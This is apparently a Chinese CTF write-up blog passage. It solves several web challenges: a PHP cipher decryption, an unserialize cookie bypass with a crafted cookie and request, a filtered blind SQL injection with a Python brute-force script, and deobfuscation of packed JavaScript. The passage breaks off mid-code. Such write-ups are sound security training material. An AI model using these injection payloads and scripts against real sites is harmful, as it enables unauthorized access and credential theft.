<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = md5(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = strlen(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= chr((ord(<span class="variable">$data</span>[<span class="variable">$i</span>]) + ord(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解密脚本如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = md5(<span class="string">&#x27;ISCC&#x27;</span>);  <span class="comment">// 对密钥进行md5加密</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span>=base64_decode(<span class="variable">$str</span>); <span class="comment">//对加密后的字符串base64解码</span></span><br><span class="line">    <span class="variable">$len</span>=strlen(<span class="variable">$str</span>);     </span><br><span class="line">    <span class="variable">$klen</span>=strlen(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)   <span class="comment">//计算出char字符数组，用于最后的减操作</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$x</span>==<span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span>.=<span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>;<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$data</span>.=chr((ord(<span class="variable">$str</span>[<span class="variable">$i</span>])-ord(<span class="variable">$char</span>[<span class="variable">$i</span>])+<span class="number">128</span>)%<span class="number">128</span>);  <span class="comment">//加上128为了防止出现负数。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(decode(<span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" alt="encode.png"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>网址打不开</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag</span><br><span class="line">&#123;                                           </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
<p>直接构造</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ISecer</span>=s:<span class="number">21</span>:<span class="string">&quot;ISecer:www.isecer.com&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL</p>
<p>所以真正的payload：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ISecer</span>=s:<span class="number">0</span>:<span class="string">&quot;&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>请求头</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /flagphp/ HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">123.206.87.240:8002</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; WOW<span class="number">64</span>; rv:<span class="number">46</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">46</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,en-US;q=<span class="number">0</span>.<span class="number">5</span>,en;q=<span class="number">0</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">DNT</span>: <span class="number">1</span></span><br><span class="line"><span class="attribute">Cookie</span>: ISecer=s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>



<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>带有过滤的sql注入</p>
<p>先测试一下过滤哪些字符</p>
<p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" alt="sql2-2.png"></p>
<p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
<p>所以猜测sql查询语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; select * from users where username&#x3D;$username;</span><br></pre></td></tr></table></figure>

<h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(<span class="name">substr</span>((<span class="name">select</span> database(),<span class="number">1</span>,<span class="number">1</span>)))&gt;50</span><br></pre></td></tr></table></figure>

<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
<p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</span><br></pre></td></tr></table></figure>

<p>reverse 为字符串反转函数</p>
<p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" alt="sql2-1.png"></p>
<p>确定盲注的判断条件</p>
<p>当上面的语句成立时返回的是 username error </p>
<p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" alt="sql2-4.png"></p>
<p>不成立时返回的是password  error  </p>
<p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" alt="sql-3.png"></p>
<p>编写脚本</p>
<p>因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://123.206.87.240:8007/web2/login.php&quot;</span></span><br><span class="line">cookie =&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;</span>&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:payload,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&quot;111&quot;</span>&#125;</span><br><span class="line">        res = requests.post(url=url,cookies=cookie,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            password +=j</span><br><span class="line">            <span class="comment">#print(password)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" alt="sql2-5.png"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">005b81fd960f61505237dbb7a3202910</span></span><br><span class="line"><span class="attribute">md5</span>在线解码后为admin<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>登录后即可用ls命令，就可以拿到flag</p>
<p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
<p>参考叶师傅：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2583">https://xz.aliyun.com/t/2583</a></p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>进入页面是一个博客的页面，有搜索功能，没有思路</p>
<p>于是扫描目录</p>
<p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" alt="blog.png"></p>
<p>但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>tips:不要一次就放弃</p>
<p>是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法</p>
<p>那就万事不觉扫以下</p>
<p>还真有发现</p>
<p>扫到三个目录</p>
<p>login.php</p>
<p>register.php</p>
<p>show.php</p>
<p>访问show.php,拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" alt="trim.png"></p>
<h2 id="login2-SKCTF-login3-文件上传2-login4"><a href="#login2-SKCTF-login3-文件上传2-login4" class="headerlink" title="login2(SKCTF)  login3  文件上传2  login4"></a>login2(SKCTF)  login3  文件上传2  login4</h2><p>题目都挂了</p>
<h2 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h2><p>提示:学会如来神掌就可以打败他了吧</p>
<p>进入题目发现还真像是游戏的界面</p>
<p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
<p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" alt="mt-1.png"></p>
<p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
<p><strong>查看源码</strong>    </p>
<p>在wulin.php中可以看到三个js文件</p>
<p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" alt="mt-2.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//script.js 在线格式化后的结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p, a, c, k, e, r</span>) </span>&#123;</span><br><span class="line">	e = <span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (c &lt; <span class="number">62</span> ? <span class="string">&#x27;&#x27;</span> : e(<span class="built_in">parseInt</span>(c / <span class="number">62</span>))) + ((c = c % <span class="number">62</span>) &gt; <span class="number">35</span> ? <span class="built_in">String</span>.fromCharCode(c + <span class="number">29</span>) : c.toString(<span class="number">36</span>))</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span>.replace(<span class="number">0</span>, e) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (c--) r[e(c)] = k[c];</span><br><span class="line">		k = [<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> r[e] || e</span><br><span class="line">		&#125;];</span><br><span class="line">		e = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;[57-9abd-hj-zAB]&#x27;</span></span><br><span class="line">		&#125;;</span><br><span class="line">		c = <span class="number">1</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">while</span> (c--)</span><br><span class="line">		<span class="keyword">if</span> (k[c]) p = p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span> + e(c) + <span class="string">&#x27;\\b&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), k[c]);</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line">&#125;(<span class="string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="number">38</span>, <span class="string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>), <span class="number">0</span>, &#123;&#125;))</span><br></pre></td></tr></table></figure>

<p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="number">38</span>, <span class="string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="string">&#x27;|&#x27;</span>), <span class="number">0</span>, &#123;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>删除eval在浏览器的控制台跑出的结果</p>
<p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" alt="mt-4.png"></p>
<p>在线代码格式化后如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i].trim();</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name) == <span class="number">0</span>) <span class="keyword">return</span> c.substring(name.length, c.length)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_create</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="keyword">new</span> Base64();</span><br><span class="line">    <span class="keyword">var</span> result = base.decode(temp);</span><br><span class="line">    <span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> num = result[i].charCodeAt();</span><br><span class="line">        num = num ^ i;</span><br><span class="line">        num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">        result3 += <span class="built_in">String</span>.fromCharCode(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ertqwe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp_name = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> temp = getCookie(temp_name);</span><br><span class="line">    temp = <span class="built_in">decodeURIComponent</span>(temp);</span><br><span class="line">    <span class="keyword">var</span> mingwen = decode_create(temp);</span><br><span class="line">    <span class="keyword">var</span> ca = mingwen.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (-<span class="number">1</span> &lt; ca[i].indexOf(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            key = ca[i + <span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        